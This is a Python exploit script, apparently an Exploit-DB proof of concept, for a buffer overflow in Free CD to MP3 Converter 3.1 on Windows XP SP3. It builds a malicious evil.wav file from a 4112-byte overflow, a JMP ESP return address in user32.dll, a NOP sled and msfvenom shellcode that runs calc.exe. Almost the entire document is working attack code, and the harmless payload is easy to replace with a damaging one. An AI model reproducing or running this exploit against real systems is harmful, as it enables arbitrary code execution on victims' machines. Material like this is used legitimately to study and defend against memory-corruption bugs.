#!/usr/share/python
#-----------------------------------------------------------------------------------------------------------#
# Software      = Free CD to MP3 Converter 3.1 - Buffer Overflow                                            #
# Download Link = https://www.exploit-db.com/apps/b8d87f65406d8524d79742359b81dd4c-cdtomp3freeware.exe      #
# Date          = 11/08/2017                                                                                #
# Reference     = https://www.exploit-db.com/exploits/15480/                                                #
# Author        = @ihack4falafel                                                                            #
# Tested on     = Windows XP SP3 - Professional                                                             #
# EIP Offset    = 4112                                                                                      #
# Badchars      = "\x00\x0A"                                                                                #
# RET Address   = 0x7e429353 : "\xFF\xE4" | [user32.dll]                                                    #
# Usage         = File > WAV to WAV... > evil.wav                                                           #        
#-----------------------------------------------------------------------------------------------------------#

import struct
import time

#--------------------------------------------------------------------------#
# msfvenom -p windows/exec CMD=calc.exe -b "\x00\x0A" -f python -v payload #
#--------------------------------------------------------------------------#

payload =  ""
payload += "\xbd\xf7\x87\xa8\x10\xda\xdd\xd9\x74\x24\xf4\x58"
payload += "\x2b\xc9\xb1\x31\x31\x68\x13\x03\x68\x13\x83\xe8"
payload += "\x0b\x65\x5d\xec\x1b\xe8\x9e\x0d\xdb\x8d\x17\xe8"
payload += "\xea\x8d\x4c\x78\x5c\x3e\x06\x2c\x50\xb5\x4a\xc5"
payload += "\xe3\xbb\x42\xea\x44\x71\xb5\xc5\x55\x2a\x85\x44"
payload += "\xd5\x31\xda\xa6\xe4\xf9\x2f\xa6\x21\xe7\xc2\xfa"
payload += "\xfa\x63\x70\xeb\x8f\x3e\x49\x80\xc3\xaf\xc9\x75"
payload += "\x93\xce\xf8\x2b\xa8\x88\xda\xca\x7d\xa1\x52\xd5"
payload += "\x62\x8c\x2d\x6e\x50\x7a\xac\xa6\xa9\x83\x03\x87"
payload += "\x06\x76\x5d\xcf\xa0\x69\x28\x39\xd3\x14\x2b\xfe"
payload += "\xae\xc2\xbe\xe5\x08\x80\x19\xc2\xa9\x45\xff\x81"
payload += "\xa5\x22\x8b\xce\xa9\xb5\x58\x65\xd5\x3e\x5f\xaa"
payload += "\x5c\x04\x44\x6e\x05\xde\xe5\x37\xe3\xb1\x1a\x27"
payload += "\x4c\x6d\xbf\x23\x60\x7a\xb2\x69\xee\x7d\x40\x14"
payload += "\x5c\x7d\x5a\x17\xf0\x16\x6b\x9c\x9f\x61\x74\x77"
payload += "\xe4\x9e\x3e\xda\x4c\x37\xe7\x8e\xcd\x5a\x18\x65"
payload += "\x11\x63\x9b\x8c\xe9\x90\x83\xe4\xec\xdd\x03\x14"
payload += "\x9c\x4e\xe6\x1a\x33\x6e\x23\x79\xd2\xfc\xaf\x50"
payload += "\x71\x85\x4a\xad"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP - RET Address #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer  = "A" * 4112
buffer += struct.pack('<L', 0x7e429353)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (5000-4112-4-40-len(payload))

try:
  f=open("evil.wav","w")
  print "[+] Creating %s bytes evil payload.." %len(buffer)
  time.sleep(5)
  f.write(buffer)
  f.close()
  print "[+] File created! Go ahead and load that file."
except:
  print "[-] File cannot be created"
  
